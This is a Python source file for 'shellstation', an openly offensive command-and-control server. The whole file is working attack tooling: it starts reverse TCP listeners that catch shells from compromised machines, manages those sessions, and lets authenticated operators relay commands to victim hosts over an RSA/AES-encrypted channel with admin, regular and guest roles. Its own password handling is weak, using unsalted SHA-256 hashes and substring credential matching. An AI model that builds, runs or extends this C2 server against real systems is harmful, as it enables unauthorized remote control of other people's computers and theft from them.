#!/usr/bin/python3

import socket
import threading
from typing import Optional
from termcolor import colored
import os
import importlib
import cmd
import time
import sys
import getpass
import argparse
from datetime import datetime

from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from Crypto.Cipher import AES
import hashlib


parser = argparse.ArgumentParser("./server")
parser.add_argument("-p", "--port", action="store", default=None, help="The port to start the server C2 on")
parser.add_argument("-l", "--listen", action="store", default=None, help="The port to start the listener on for incoming payloads")
parsed = parser.parse_args()

shellprompt = "shellstation"
module_folder = "modules"
next_part = colored(" > ",attrs=["bold"])
modified_prompt = colored(shellprompt,attrs=["bold","underline"])
input_str = modified_prompt + next_part
debug = False

server_port = parsed.__getattribute__("port")
listen_port = parsed.__getattribute__("listen")

if server_port != None:
    server_port = int(server_port)

    if listen_port == None:
        print("-p option must be used in combination with -l")
        exit()
    else:
        listen_port = int(listen_port)

class Sessions:
    def __init__(self):
        self.session_id = 0
        self.sessions = {}

class Stop:
    def __init__(self):
        self.stop = False

class Module:
    def __init__(self):
        self.handlers = {}
        self.module_object = None
        self.module_str = None

session_obj = Sessions()
st = Stop()
st.stop = False
module = Module()
stop_listening = False

class ConnectionHandler:        # class holding connection methods, meant to be used like a static classes
    def receive_data(conn,st):
        while True:
            if st.stop == True:
                return
            try:
                conn.settimeout(0.5)
                data = conn.recv(1024)
                data = data.decode("ascii","ignore")
                print(data, end="", flush=True)
            except BrokenPipeError:
                st.stop = True
                print(colored("[*]","blue",attrs=["bold"]), "Session died")
                return
            except socket.timeout:
                pass
            except Exception as e:
                print(colored("[-]","red",attrs=["bold"]), str(e))


    def send_data(conn,st):
        while True:
            try:
                send_data_var = (input() + "\n").encode("ascii","ignore")
                if send_data_var.decode()[:-1] in ["bg","background"]:
                    print(colored("[*]","blue",attrs=["bold"]), "Backgrounding the session\n")
                    st.stop = True
                    return
                conn.send(send_data_var)
            except KeyboardInterrupt:
                st.stop = True
                return
            except BrokenPipeError:
                st.stop = True
                print(colored("[*]","blue",attrs=["bold"]), "Session died")
                return

    def read_stream(conn):
        stream = b""
        default_timeout = 5
        while True:
            try:
                conn.settimeout(default_timeout)
                stream += conn.recv(1024)
                default_timeout = 0.1
            except socket.timeout:
                return stream

    def listen_for_connections(port ,host="0.0.0.0"):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((host,port))
        s.listen()
        print("\n" + colored("[*]","blue",attrs=["bold"]), "Started reverse TCP listener on port {0}".format(port))
        log.append_file("Started reverse TCP listener on port {0}".format(port))
        try:
            while True:
                (conn, addr) = s.accept()
                session_obj.session_id = session_obj.session_id + 1
                print(colored("[+]","green",attrs=["bold"]), "Connection received from {0}".format(str(addr[0]) + ":" + str(addr[1])))
                log.append_file("Connection received from {0}".format(str(addr[0]) + ":" + str(addr[1])))
                
                session_obj.sessions[str(session_obj.session_id)] = {"socket":(conn,addr), "last_interaction":int(time.time())}            
        except KeyboardInterrupt:
            print("\n")
            s.close()
            pass

    def listen_in_background(port,host="0.0.0.0"):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((host,port))
        s.listen()
        print("\n" + colored("[*]","blue",attrs=["bold"]), "Started reverse TCP listener on port {0}".format(port))
        log.append_file("Started reverse TCP listener on port {0}".format(port))
        global stop_listening
        stop_listening = False
        try:
            while True:
                try:
                    if stop_listening:
                        break
                    s.settimeout(2)
                    (conn, addr) = s.accept()
                except socket.timeout:
                    continue
                session_obj.session_id = session_obj.session_id + 1
                print(colored("[*]","blue",attrs=["bold"]), "Connection received from {0}".format(str(addr[0]) + ":" + str(addr[1])))
                log.append_file("Connection received from {0}".format(str(addr[0]) + ":" + str(addr[1])))

                session_obj.sessions[str(session_obj.session_id)] = {"socket":(conn,addr), "last_interaction":int(time.time())}
        except KeyboardInterrupt:
            print("\n")
            pass

    def stop_handler():
        global stop_listening
        stop_listening = True


class SessionHandler:
        
    def list_sessions(print_output=True):
        ret = ""
        ret += "\nSESSIONS\n========\n\n"
        if print_output: 
            print("\nSESSIONS\n========\n")
        for i in session_obj.sessions:
            conn, addr = session_obj.sessions[i]["socket"]
            if print_output:
                print(i.ljust(5) + " =>   " + str(addr[0]) + ":" + str(addr[1]))
            ret = ret + i.ljust(5) + " =>   " + str(addr[0]) + ":" + str(addr[1]) + "\n"
        if print_output:
            print()
        return ret


    def check_connection(key):
        connx,addrx = session_obj.sessions[key]["socket"]
        try:
            connx.send("\n".encode())
            connx.send("\n".encode())
        except ConnectionError as e:
            print(colored("[*]","blue",attrs=["bold"]), "Command shell session {0} has been terminated".format(key))
            c,a = session_obj.sessions[key]["socket"]
            c.close()
            del session_obj.sessions[key]
            return False
        
        return True


    def get_handlers(foldername="modules", willDisplay=True):
        if willDisplay:
            print("\nAvailable Handlers\n==================\n")
        module.handlers = {}
        
        os.system("mkdir " + foldername + " 2>/dev/null")
        os.system("cd {0} && ls -l *.py 2>/dev/null | tr -s ' ' | cut -d ' ' -f 9 > output.txt".format(foldername))
        content = ""
        with open("./{0}/output.txt".format(foldername), "r") as f:
            content = f.read()
        os.system("cd {0} && rm output.txt".format(foldername))
        content = content.split("\n")

        lines = []
        for x in content:
            if (x == "") or ("__" in x) or (x == "output.txt"):
                pass
            else:
                lines.append(x.split(".")[0])
        
        index = 2
        module.handlers["1"] = "default"
        if willDisplay:
            print("1".ljust(5) + "default")
        for i in lines:
            if (willDisplay):
                print(str(index).ljust(5) + i)
            module.handlers[str(index)] = i
            index += 1

        if willDisplay:
            print()

        return lines

    def use(handler_id):
        for i in module.handlers:
            if i == handler_id or module.handlers[i] == handler_id:
                return module.handlers[i].split(".")[0]
        return None


class CLIMode(cmd.Cmd):
    module_folder = "modules"
    next_part = colored(" > ",attrs=["bold"])
    modified_prompt = colored(shellprompt,attrs=["bold","underline"])
    prompt = modified_prompt + next_part
    lines = SessionHandler.get_handlers(module_folder,willDisplay=False)

    def eliminate(self, iterable):
        ret = []
        for i in iterable:
            if i:
                ret.append(i)
        return ret

    def do_use(self,args: str):
        splitted = self.eliminate(args.split(" "))
        try:
            ret = SessionHandler.use(splitted[0])
        except IndexError:
            print(colored("[*]","blue",attrs=["bold"]),"No module specified")
            return
        if ret == None:
            print(colored("[-]","red",attrs=["bold"]), "Invalid module")
            return
        elif ret.lower() == "default":
            module.module_object = None
            module.module_str = "default"

        else:
            module.module_object = importlib.import_module(module_folder + "." + ret)
            module.module_str = ret
        
        self.prompt = modified_prompt + colored(" (" + module.module_str + ")","blue") + next_part


    def do_modules(self,args):
        SessionHandler.get_handlers(module_folder,True)


    def do_exit(self,args):
        os.system("kill -15 " + str(os.getpid()))
        sys.exit()


    def do_sessions(self,args: str):
        SessionHandler.list_sessions()


    def do_interact(self,args: str):
        splitted = self.eliminate(args.split(" "))
        try:
            print(colored("[*]","blue",attrs=["bold"]), "Interacting with session {0}\n".format(splitted[0]))
        except IndexError:
            return
        try:
            connx,addrx = session_obj.sessions[splitted[0]]["socket"]
        except KeyError:
            print(colored("[-]","red",attrs=["bold"]), "Session id {0} is invalid".format(splitted[0]))
            return

        if SessionHandler.check_connection(splitted[0]) == False:
            return
        st.stop = False
        if module.module_object != None:
            thread = threading.Thread(target=module.module_object.receive_data,args=(connx,st,))
        else:
            module.module_str = "default"
            print(colored("[*]","blue",attrs=["bold"]),"Using the default handler")
            thread = threading.Thread(target=ConnectionHandler.receive_data,args=(connx,st,))
        thread.start()
        if module.module_object != None:
            module.module_object.send_data(connx,st)
        else:
            ConnectionHandler.send_data(connx,st)
        thread.join()


    def do_listen(self,args: str):
        splitted = self.eliminate(args.split(" "))
        if len(splitted) == 0:
            return
        if splitted[0] == "-b":
            try:
                threading.Thread(target=ConnectionHandler.listen_in_background,args=(int(splitted[1]),)).start()
            except IndexError:
                print(colored("[-]","red",attrs=["bold"]),"No port specified")
        else:
            try:
                ConnectionHandler.listen_for_connections(int(splitted[0]))
            except IndexError:
                print(colored("[-]","red",attrs=["bold"]),"No port specified")
                
                return
            except Exception as e:
                print(colored("[-]","red",attrs=["bold"]),end=" ")
                print(str(e))

    def do_stop(self, args):
        print(colored("[*]","blue", attrs=["bold"]), "Stopping all background listener jobs")
        ConnectionHandler.stop_handler()

    def do_kill(self,args: str, shouldPrint = True):
        splitted = self.eliminate(args.split(" "))
        try:
            if splitted[0] == "all":
                for i in session_obj.sessions:
                    conn_s, addr_s = session_obj.sessions[i]["socket"]
                    try:
                        conn_s.send("exit".encode())
                        conn_s.close()
                    except ConnectionError:
                        pass
                time.sleep(1)
                session_obj.sessions = {}
            else:
                conn_s,addr_s = session_obj.sessions[splitted[0]]["socket"]
                try:
                    conn_s.send("exit".encode())
                    conn_s.close()
                except ConnectionError:
                    pass
                time.sleep(1)
                del session_obj.sessions[splitted[0]]
        except IndexError:
            if shouldPrint:
                print(colored("[-]","red", attrs=["bold"]), "Sepicfy a session to kill (ex: 1 / 2 / all ...)")
            return "error"
        except KeyError:
            if shouldPrint:
                print(colored("[-]","red", attrs=["bold"]), "Invalid session id to kill")
            return "error"
        except Exception as e:
            if shouldPrint:
                print(colored("[-]","red",attrs=["bold"]), "Exception occured in do_kill(): " + str(e))
            return "error"

    def do_clear(self, args):
        answer = input("Are you sure you want to clear the screen? y/n: ")
        try:
            if answer[0].lower() == "y":
                os.system("clear")
        except IndexError:
            pass

    def do_threads(self,args):
        print("Thread count:", threading.active_count())

    def do_register(self, args):
        uname = input("username: ")
        passwd = getpass.getpass()
        passwd = ServerMode.hash_pass(None, passwd)
        print("1 - Admin\n2 - Regular user\n3 - Guest")
        role = input("Role (1 / 2 / 3): ").replace("\n","")

        set_role = ""
        if role == "1":
            set_role = "a"
        elif role == "2":
            set_role = "r"
        elif role == "3":
            set_role = "g"
        else:
            print(colored("[-]","red",attrs=["bold"]),"Undefined role. Failed to register the user")
            return

        creds = ""
        try:
            with open("./database","r") as f:
                creds = f.read().split("\n")
        except FileNotFoundError:
            with open("database","w") as f:
                f.write("")
                creds = []

        for i in creds:
            user = i.split("/")[0]
            if uname == user:
                print(colored("[-]","red",attrs=["bold"]),"User already exists. Failed to register the user")
                return

        creds.append("{0}/{1}/{2}".format(uname,passwd,set_role))

        with open("./database","w") as f:
            f.write("\n".join(creds))
        print(colored("[+]","green",attrs=["bold"]), "Successfully registered the user")

    def do_remove(self, args):
        uname = args
        if str(uname).strip() == "":
            print(colored("[-]","red",attrs=["bold"]), "No user specified")
            return
        creds = ""
        with open("./database","r") as f:
            creds = f.read().split("\n")
        for i in creds:
            if i.split("/")[0] == uname:
                try:
                    creds.remove(i)
                except ValueError:
                    print(colored("[-]","red",attrs=["bold"]), "User does not exist")
                    return

        with open("./database","w") as f:
            f.write("\n".join(creds))

        print(colored("[+]","green",attrs=["bold"]),"Successfully removed the user")

    def do_clients(self, args):
        client_id = 0
        print("\nCLIENTS\n=======")
        for i in clients:
            client_id += 1
            print(client_id, "-", i)
        print()

    def do_deauth(slef,args: str):
        user = args
        try:
            clients[user]["socket"].close()
            del clients[user]
        except KeyError:
            print(colored("[-]","red",attrs=["bold"]), "User is not logged in")

    def do_help(self, arg: str) -> Optional[bool]:
        return super().do_help(arg)

    def help_modules(args):
        print()
        print(">> Display all available handler modules")
        print()

    def help_use(args):
        print()
        print(">> Load a python script as a module to use as a handler")
        print("Syntax: use <module_id or name>")
        print("Sample Usage: use 2 / use windows_advanced")
        print()

    def help_listen(args):
        print()
        print(">> Listen on a port")
        print("Syntax: listen <port>")
        print("Sample Usage: listen 4444")        
        print()

    def help_sessions(args):
        print()
        print(">> List all available active sessions")
        print()

    def help_interact(args):
        print()
        print(">> Interact with an active session")
        print("Syntax: interact <session_id>")
        print("Sample Usage: interact 3")
        print()

    def help_kill(args):
        print()
        print(">> Kill a session or all of the sessions")
        print("Syntax: kill <session_id or all>")
        print("Sample Usage: kill 1 / kill 3 / kill all")
        print()

    def help_exit(args):
        print()
        print(">> Exit out of the program")
        print()

    def default(self, line: str) -> bool:
        print(colored("[-]","red",attrs=["bold"]),"Command not defined:", line.split(" ")[0])

    def emptyline(self):
        pass


if server_port != None:
    keyPair = RSA.generate(3072)
    pubKey = keyPair.publickey()
    pubKeyByte = pubKey.export_key()

    encryptor = PKCS1_OAEP.new(pubKey)
    decryptor = PKCS1_OAEP.new(keyPair)

clients = {}

class AESEncrypt:
    def tuple_to_str(obj):
        result = []
        for i in obj:
            result.append(bytes(i).hex())
        return ",".join(result)

    def aes_encrypt(data: str, key):
        try:
            cipher = AES.new(key,AES.MODE_EAX)
            nonce = cipher.nonce
            ciphertext, tag = cipher.encrypt_and_digest(data.encode())
            return (ciphertext, tag, nonce)
        except:
            return None

    def aes_decrypt(data, key):
        cipher_text = data[0]
        tag = data[1]
        nonce = data[2]
        decipher = AES.new(key,AES.MODE_EAX,nonce=nonce)
        decrypted = decipher.decrypt(cipher_text)
        try:
            decipher.verify(tag)
            return decrypted
        except ValueError:
            return None

class ServerMode:

    def start_server(self, port):
        so = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        so.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        so.bind(("0.0.0.0",port))
        print(colored("[*]","blue",attrs=["bold"]),"C2 server is running on port " + str(port))
        log.append_file("C2 server is listening on " + str(port))
        so.listen()

        global clients

        threading.Thread(target=self.handle_clients,args=(clients,)).start()

        while True:
            conn,addr = so.accept()
            try:
                user_info = self.authenticate(conn, clients)

            except Exception as e:
                print("Unexpected exception in authenticate(): " + str(e))
                log.append_file("DEBUG: Unexpected exception in authenticate(): " + str(e))
                continue

            if user_info[0] == None:
                try:
                    conn.send("client_present".encode())
                except:
                    pass
                del conn
                del addr
                continue

            if user_info[0] == False:
                try:
                    conn.send("failiure".encode())
                except:
                    pass
                del conn
                del addr
                continue
            else:
                conn.send("OK".encode())

                try:
                    aes_key_encrypted = ConnectionHandler.read_stream(conn)
                except:
                    continue
                key = decryptor.decrypt(aes_key_encrypted)

                corrupted_message_count = 0

                byte_arr = []
                try:
                    data_to_decrypt = ConnectionHandler.read_stream(conn)
                except:
                    continue

                for i in data_to_decrypt.decode().split(","):
                    byte_arr.append(bytes.fromhex(i))
                byte_arr = tuple(byte_arr)
                decrypted = AESEncrypt.aes_decrypt(byte_arr, key)
                if decrypted == None:
                    print("Encrypted data from sender '{0}' is invalid or corrupted. Session failed!".format(user_info[1]))
                    log.append_file("Encrypted data from sender '{0}' is invalid or corrupted. Session failed!".format(user_info[1]))
                    continue

                if decrypted.decode() != "client_hello":
                    print("Received unexpected client data from '{0}'. Session failed!".format(user_info[1]))
                    log.append_file("Received unexpected client data from '{0}'. Session failed!".format(user_info[1]))
                    continue
                
            print(colored("[*]","blue",attrs=["bold"]), "Client '{0}' connected".format(str(user_info[1])))
            log.append_file("Client '{0}' connected".format(str(user_info[1])))
            clients[user_info[1]] = {"socket":conn, "role":user_info[2], "aes":key, "failed":corrupted_message_count}

    def hash_pass(self, password):
        hashed = hashlib.sha256(password.encode("utf-8","ignore"))
        return hashed.hexdigest()

    def authenticate(self, conn, clients):
        conn.send(pubKeyByte)
        boolean = False

        try:
            credentials = ConnectionHandler.read_stream(conn)
        except:
            return [False, None, None]
        
        decrypted = decryptor.decrypt(credentials).decode()
        u = decrypted.split(":")[0]

        # for i in clients:     # if a client is already logged in dont accept any other authentication attempts until they log out
        #     if i == u:
        #         return [None, None, None]

        p = decrypted.split(":")[1]
        p = self.hash_pass(p)
        lines = []
        with open("database","r") as f:
            contents = f.read()
            lines = contents.split("\n")
            if u + "/" + p in contents:
                boolean = True
            else:
                boolean = False

        for i in lines:
            if u in i:
                splitted = i.split("/")
                return [boolean, splitted[0], splitted[2]]
        return [boolean, None, None]

    def handle_clients(self, clients):
        while True:
            iterate = clients.copy()
            for i in iterate:
                soc_obj = clients[i]["socket"]
                try:

                    soc_obj.settimeout(0.1)
                    cmd_data = bytes(soc_obj.recv(16384)) # get the command from the client

                    byte_arr = []       # Decryption of command received by the client
                    for x in cmd_data.decode().split(","):
                        byte_arr.append(bytes.fromhex(x))
                    enc_data = tuple(byte_arr)
                    
                    try:
                        cmd_data = AESEncrypt.aes_decrypt(enc_data,clients[i]["aes"])
                    except Exception as e:
                        print(colored("[*]","blue",attrs=["bold"]),"Client '{0}' disconnected".format(str(i)))
                        log.append_file("Client '{0}' disconnected".format(str(i)))
                        if debug:
                            print(colored("DEBUG","red"), "Potential reason: Client data is corrupted or session has been terminated by the client")
                            print(colored("DEBUG","red"), "Exception thrown:", e, type(e))
                        clients[i] = None
                        continue

                    cmd_data = cmd_data.decode("utf-8","ignore")

                    if (len(cmd_data) == 0):
                        print(colored("[*]","blue",attrs=["bold"]),"Client '{0}' disconnected".format(str(i)))
                        log.append_file("Client '{0}' disconnected".format(str(i)))
                        clients[i] = None
                        continue
                    

                    if ("register" in cmd_data[0:8]) and clients[i]["role"] != "a":
                        print(colored("[*]","blue",attrs=["bold"]),"The client {0} failed to register a user. Reason: Permission denied".format(str(i)))
                        log.append_file("The client {0} failed to register a user. Reason: Permission denied".format(str(i)))
                        enc_tuple = AESEncrypt.aes_encrypt("Operation not permitted",clients[i]["aes"])
                        str_tuple = AESEncrypt.tuple_to_str(enc_tuple)
                        soc_obj.send(str_tuple.encode())
                        continue
                    elif ("register" in cmd_data[0:8]) and clients[i]["role"] == "a":
                        args = cmd_data.replace("register","")
                        args = args.split(" ")
                        args_clean = []
                        for j in args:
                            if j == "":
                                continue
                            else:
                                args_clean.append(j)
                        
                        try:
                            ret = self.register(args_clean[0],args_clean[1],args_clean[2], str(i))
                        except IndexError:
                            print(colored("[-]","red",attrs=["bold"]),"Invalid fromat")
                            enc_tuple = AESEncrypt.aes_encrypt("Invalid format",clients[i]["aes"])
                            str_tuple = AESEncrypt.tuple_to_str(enc_tuple)
                            soc_obj.send(str_tuple.encode())
                            continue

                        enc_tuple = AESEncrypt.aes_encrypt(ret[1],clients[i]["aes"])
                        str_tuple = AESEncrypt.tuple_to_str(enc_tuple)
                        soc_obj.send(str_tuple.encode())
                        continue


                    if ("remove" in cmd_data[0:7]) and clients[i]["role"] != "a":
                        args = cmd_data.replace("remove","").strip()
                        if len(args):
                            print(colored("[*]","blue",attrs=["bold"]),"The client {0} failed to remove {1}. Reason: Permission denied".format(str(i), args))
                            log.append_file("The client {0} failed to remove {1}. Reason: Permission denied".format(str(i), args))
                        enc_tuple = AESEncrypt.aes_encrypt("Operation not permitted",clients[i]["aes"])
                        str_tuple = AESEncrypt.tuple_to_str(enc_tuple)
                        soc_obj.send(str_tuple.encode())
                        continue
                    elif ("remove" in cmd_data[0:7]) and clients[i]["role"] == "a":
                        args = cmd_data.replace("remove","")
                        ret = self.remove_user(args, str(i))
                        if ret == False:
                            enc_tuple = AESEncrypt.aes_encrypt("Failiure",clients[i]["aes"])
                            str_tuple = AESEncrypt.tuple_to_str(enc_tuple)
                            soc_obj.send(str_tuple.encode())
                            continue
                        else:
                            log.append_file(str(i) + " successfully removed the user " + args)
                            enc_tuple = AESEncrypt.aes_encrypt("Success",clients[i]["aes"])
                            str_tuple = AESEncrypt.tuple_to_str(enc_tuple)
                            soc_obj.send(str_tuple.encode())
                            continue


                    if ("clients" in cmd_data[0:7]) and clients[i]["role"] != "a":
                        enc_tuple = AESEncrypt.aes_encrypt("Operation not permitted",clients[i]["aes"])
                        str_tuple = AESEncrypt.tuple_to_str(enc_tuple)
                        soc_obj.send(str_tuple.encode())
                        continue
                    elif ("clients" in cmd_data[0:7]) and clients[i]["role"] == "a":
                        send_client = self.list_clients(clients)
                        enc_tuple = AESEncrypt.aes_encrypt(send_client,clients[i]["aes"])
                        str_tuple = AESEncrypt.tuple_to_str(enc_tuple)
                        soc_obj.send(str_tuple.encode())
                        continue


                    if ("deauth" in cmd_data[0:7]) and clients[i]["role"] != "a":
                        args = cmd_data.replace("deauth","").strip()
                        if len(args):
                            print(colored("[*]","blue",attrs=["bold"]),"The client {0} falied to deauthenticate {1}. Reason: Permission denied".format(str(i), str(args)))
                            log.append_file("The client {0} falied to deauthenticate {1}. Reason: Permission denied".format(str(i), str(args)))
                        enc_tuple = AESEncrypt.aes_encrypt("Operation not permitted",clients[i]["aes"])
                        str_tuple = AESEncrypt.tuple_to_str(enc_tuple)
                        soc_obj.send(str_tuple.encode())
                        continue
                    elif ("deauth" in cmd_data[0:7]) and clients[i]["role"] == "a":
                        args = cmd_data.replace("deauth","").strip()
                        isDeauthenticated = False
                        for k in clients.copy():
                            if k == args:
                                print(colored("[+]","green",attrs=["bold"]), "Deauthenticating '{0}'".format(str(args)))
                                log.append_file(str(i) + " is deauthenticating the client " + str(args))
                                clients[k]["socket"].close()
                                isDeauthenticated = True
                                clients[k] = None

                        if isDeauthenticated == False:
                            print(colored("[-]","red",attrs=["bold"]), "The client '{0}' is not logged in".format(str(args)))
                            enc_tuple = AESEncrypt.aes_encrypt("Failiure",clients[i]["aes"])
                            str_tuple = AESEncrypt.tuple_to_str(enc_tuple)
                            soc_obj.send(str_tuple.encode())

                        if isDeauthenticated == True:
                            enc_tuple = AESEncrypt.aes_encrypt("Success",clients[i]["aes"])
                            str_tuple = AESEncrypt.tuple_to_str(enc_tuple)
                            soc_obj.send(str_tuple.encode())
                        
                        continue

                    if "kill" in cmd_data[0:5] and clients[i]["role"] != "a":
                        args = cmd_data.replace("kill","").strip()
                        if len(args):
                            print(colored("[*]","blue",attrs=["bold"]),"The client {0} failed to kill the session {1}. Reason: Permission denied".format(str(i), str(args)))
                            log.append_file("The client {0} failed to kill the session {1}. Reason: Permission denied".format(str(i), str(args)))
                        enc_tuple = AESEncrypt.aes_encrypt("Operation not permitted",clients[i]["aes"])
                        str_tuple = AESEncrypt.tuple_to_str(enc_tuple)
                        soc_obj.send(str_tuple.encode())
                        continue
                        
                    elif "kill" in cmd_data[0:5] and clients[i]["role"] == "a":
                        args = cmd_data.replace("kill","").strip()
                        ret_val = CLIMode().do_kill(args, False)
                        if ret_val == "error":
                            enc_tuple = AESEncrypt.aes_encrypt("Invalid session spesification",clients[i]["aes"])
                            str_tuple = AESEncrypt.tuple_to_str(enc_tuple)
                            soc_obj.send(str_tuple.encode())
                        else:
                            print(colored("[*]","blue",attrs=["bold"]),"The client {0} killed the session with ID {1}".format(str(i), str(args)))
                            log.append_file("The client {0} killed the session with ID {1}".format(str(i), str(args)))
                            enc_tuple = AESEncrypt.aes_encrypt("Success",clients[i]["aes"])
                            str_tuple = AESEncrypt.tuple_to_str(enc_tuple)
                            soc_obj.send(str_tuple.encode())
                        continue

                    if cmd_data == "sessions":
                        session_data = SessionHandler.list_sessions(print_output=False)
                        enc_tuple = AESEncrypt.aes_encrypt(session_data, clients[i]["aes"])
                        str_tuple = AESEncrypt.tuple_to_str(enc_tuple)
                        soc_obj.send(str_tuple.encode())
                        continue

                    if cmd_data == "keep_alive":
                        enc_tuple = AESEncrypt.aes_encrypt("reply_keep_alive", clients[i]["aes"])
                        str_tuple = AESEncrypt.tuple_to_str(enc_tuple)
                        soc_obj.send(str_tuple.encode())
                        continue


                    try:
                        c_obj = clients[i]["socket"]        # set the client object
                        c_str = cmd_data.split("::")[1]     # set the command to execute
                        s_id = cmd_data.split("::")[0]      # set the shell session id
                    except IndexError:
                        enc_tuple = AESEncrypt.aes_encrypt("Invalid input",clients[i]["aes"])
                        str_tuple = AESEncrypt.tuple_to_str(enc_tuple)
                        soc_obj.send(str_tuple.encode())
                        continue


                    # Do not create concurrent treads in case commands from multiple clients might get mixed up

                    # threading.Thread(target=client_listen, args=(c_obj,c_str,s_id,clients,str(i))).start()
                    self.client_listen(c_obj,c_str,s_id,clients,str(i))

                except socket.timeout:
                    continue

                except ConnectionError as e:                
                    print(colored("[*]","blue",attrs=["bold"]),"Client '{0}' disconnected".format(str(i)))
                    log.append_file("Client '{0}' disconnected".format(str(i)))
                    clients[i] = None
                    continue
                
                except OSError:
                    print(colored("[*]","blue",attrs=["bold"]),"Client '{0}' disconnected".format(str(i)))
                    log.append_file("Client '{0}' disconnected".format(str(i)))
                    clients[i] = None
                    continue
                
                except Exception as e:
                    print(colored("[!]","yellow",attrs=["bold"]), "Exception occured in handle_clients(): " + str(e))
                    log.append_file("DEBUG: Exception occured in handle_clients(): " + str(e))
                    clients[i] = None
            
            for key, value in clients.copy().items():  # remove the disconnected clients from the dictionary
                if value == None:
                    del clients[key]

            time.sleep(0.1)

    def client_listen(self, conn, cmd_data, session_id, clients, client_id):
        send_data = cmd_data + "\n"
        import re
        if (("exit" in cmd_data) or ("kill" in cmd_data) or (re.match(r".*`.*",cmd_data)) or (re.match(r".*\(.*",cmd_data))) and (clients[client_id]["role"] != "a"):
            enc_tuple = AESEncrypt.aes_encrypt("Operation not permitted!\n", clients[client_id]["aes"])
            enc_tuple = AESEncrypt.tuple_to_str(enc_tuple)
            conn.send(enc_tuple.encode())
            return
        

        try:
            (session_obj.sessions[session_id])["socket"][0].send(send_data.encode()) # send the command to be execute to the target
            (session_obj.sessions[session_id])["last_interaction"] = int(time.time()) # update the last interaction time

        except KeyError:
            print(colored("[-]","red",attrs=["bold"]),"Invalid session id from client {0}".format(client_id))
            log.append_file("Invalid session id from client {0}".format(client_id))  # Not a very useful log
            enc_tuple = AESEncrypt.aes_encrypt("Invalid session\n", clients[client_id]["aes"])
            enc_tuple = AESEncrypt.tuple_to_str(enc_tuple)
            conn.send(enc_tuple.encode())
            return
        except ConnectionError:
            del session_obj.sessions[session_id]
        
        
        string_data = ""
        timeout = 2
        null_response = 0
        while True:
            try:
                (session_obj.sessions[session_id])["socket"][0].settimeout(timeout)
                command_output = (session_obj.sessions[session_id])["socket"][0].recv(1024).decode("utf-8","ignore")
                string_data += command_output
                
                if len(command_output) == 0:
                    null_response += 1

                if null_response >= 10:
                    return
                
                timeout = 0.1

            except socket.timeout:
                enc_tuple = AESEncrypt.aes_encrypt(string_data, clients[client_id]["aes"])
                str_tuple = AESEncrypt.tuple_to_str(enc_tuple)
                conn.send(str_tuple.encode())
                return

            except KeyError:
                died = encryptor.encrypt((client_id + "::Session died").encode())
                conn.send(died)
                return
            except ConnectionError:
                return
            
    def register(self, usr,ps,rl,client_name):
        uname = usr 
        passwd = ps
        passwd = self.hash_pass(passwd)
        role = rl
        
        set_role = ""
        if role == "a":
            set_role = "a"
        elif role == "r":
            set_role = "r"
        elif role == "g":
            set_role = "g"
        else:
            print(colored("[-]","red",attrs=["bold"]),"Undefined role. Failed to register the user (Client: {0})".format(client_name))
            log.append_file(client_name + " failed to register the user " + usr + ". Undefined role")
            return [False, "Invalid role"]

        creds = ""
        with open("./database","r") as f:
            creds = f.read().split("\n")

        for i in creds:
            user = i.split("/")[0]
            if uname == user:
                print(colored("[-]","red",attrs=["bold"]),"User already exists. Failed to register the user (Client: {0})".format(client_name))
                log.append_file(client_name + " failed to register the user " + usr + ". User already exists")
                return [False, "User exists"]
        
        creds.append("{0}/{1}/{2}".format(uname,passwd,set_role))

        with open("./database","w") as f:
            f.write("\n".join(creds))
        print(colored("[+]","green",attrs=["bold"]), "Successfully registered the user (Client: {0})".format(client_name))
        log.append_file(client_name + " successfully registered the user " + usr)
        return [True, "Success"]

    def remove_user(self, usr, client_name):
        isRemoved = False
        creds = ""
        with open("./database","r") as f:
            creds = f.read().split("\n")

        creds_removed = []
        for i in creds:
            if usr == i.split("/")[0]:
                isRemoved = True
                continue
            else:
                creds_removed.append(i)
        if isRemoved:
            print(colored("[+]","green",attrs=["bold"]), "Successfully removed the user (Client: {0})".format(client_name))
            log.append_file(client_name + " successfully removed the user " + usr)
            with open("./database","w") as f:
                f.write("\n".join(creds_removed))
            return True
        else:
            print(colored("[-]","red",attrs=["bold"]), "Failed to remove the user (Client: {0})".format(client_name))
            log.append_file(client_name + " failed to remove the user " + usr)
            return False

    def list_clients(self, clients):
        client_info = "\nCLIENTS\n=======\n"
        index = 0
        for i in clients:
            index += 1
            client_info += str(index) + " - " + str(i) + "\n"
        return client_info

    def keep_alive(self):
        while True:
            for i in session_obj.sessions:
                current = time.time()
                idle = current - session_obj.sessions[i]["last_interaction"]
                if idle > 10:
                    # SET LAST INTERACTION AFTER SENDING THE DATA AGAIN
                    session_obj.sessions[i]["last_interaction"] = time.time()
                    session_obj.sessions[i]["socket"][0].send(" \n".encode())
                    string_data = ConnectionHandler.read_stream(session_obj.sessions[i]["socket"][0]).decode()
                    
                    string_data = ""
                    timeout = 2
                    null_response = 0

                    while True:
                        try:
                            session_obj.sessions[i]["socket"][0].settimeout(timeout)
                            command_output = session_obj.sessions[i]["socket"][0].recv(1024).decode("utf-8","ignore")
                            string_data += command_output
                            
                            if len(command_output) == 0:
                                null_response += 1

                            if null_response >= 10:
                                return
                            
                            timeout = 0.1

                        except socket.timeout:
                            break

                        except KeyError:
                            break

                        except ConnectionError:
                            break
            time.sleep(5)

class Logging:
    def create_log_file(self):
        with open("log","w") as f:
            f.write("")

    def append_file(self, string):
        with open("log","a") as f:
            f.write(str(datetime.now()))
            f.write(" - ")
            f.write(string)
            f.write("\n")

log = Logging()
log.create_log_file()

if server_port != None:
    server = ServerMode()
    threading.Thread(target=server.start_server, args=(server_port,)).start()
    threading.Thread(target=server.keep_alive).start()
    ConnectionHandler.listen_in_background(listen_port)
else:
    while True:
        try:
            console = CLIMode()
            console.cmdloop()
        except KeyboardInterrupt:
            print("Type exit to quit the program!")
